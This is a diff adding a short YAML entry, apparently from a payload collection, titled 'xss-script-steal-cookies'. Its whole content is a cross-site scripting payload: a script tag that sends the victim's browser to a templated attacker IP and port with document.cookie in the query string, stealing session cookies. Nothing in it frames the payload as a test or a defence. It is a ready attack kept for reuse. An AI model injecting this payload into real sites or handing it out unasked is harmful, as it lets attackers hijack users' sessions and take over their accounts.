@@ -1,0 +1,8 @@
+metadata:
+  filename: "xss-script-steal-cookies.yaml"
+  tags: ["web", "xss"]
+  created: "2025-03-29"
+  author: "@anakles"
+
+content: |
+  <script type="text/javascript">document.location="http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/?c="+document.cookie;</script>
